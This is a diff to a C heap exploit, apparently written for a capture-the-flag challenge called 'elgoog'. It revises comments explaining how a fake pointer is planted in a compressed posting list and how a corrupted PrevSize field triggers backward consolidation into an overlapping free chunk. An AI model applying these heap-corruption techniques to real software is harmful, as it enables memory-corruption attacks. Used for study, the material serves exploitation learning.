@@ -286,8 +286,8 @@ void exploit() {
 
 	ULONG32 lo = fake_pl_loc & 0xffffffff;
 	ULONG32 hi = (fake_pl_loc >> 32) & 0xffffffff;
-	// The order is important, because we will place the pointer inside a posting
-	// list, which is kept sorted.
+	// The order is important, because we want to produce this pointer as the
+	// lower/upper bound of the interpolative code for a posting list of size 2.
 	if (lo >= hi) {
 		printf("fail! lo/hi is wrong.\n");
 		exit(1);
@@ -335,7 +335,8 @@ void exploit() {
 	elgoog_add_to_index(idx_f70, 0, "ddd");
 	elgoog_add_to_index(idx_f70, 1, "ddd");
 	elgoog_add_to_index(idx_f70, 2, "ddd");
-	// The uncompressed posting list will contain the fake_pl_loc pointer
+	// The compressed posting list will contain the fake_pl_loc pointer as the
+	// lower/upper bound of the interpolative code (posting list has size 2)
 	elgoog_add_to_index(idx_f70, lo, "dddddde");
 	elgoog_add_to_index(idx_f70, hi, "dddddde");
 
@@ -464,9 +465,10 @@ void exploit() {
 	ULONG64 fake_chunk = a - 0x10 + 0x90;
 	*fake_blink = *fake_flink = fake_chunk + 0x10;
 	
-	// Free b chunk to trigger backward consolidation. This will merge the fake
-	// chunk and b, producing a free chunk of size 0xf70, and will place it in
-	// ListHeads.
+	// The PrevSize field of the b chunk is corrupted (set to 0x91). We free b
+	// to trigger a backward consolidation. This will merge the fake chunk and b,
+	// producing a free chunk of size 0xf70, and will place it in ListHeads.
+	//
 	// This free chunk overlaps with the ii_token_table at offset 0x5c0 of the/ page.
 	elgoog_close_index(b);
 
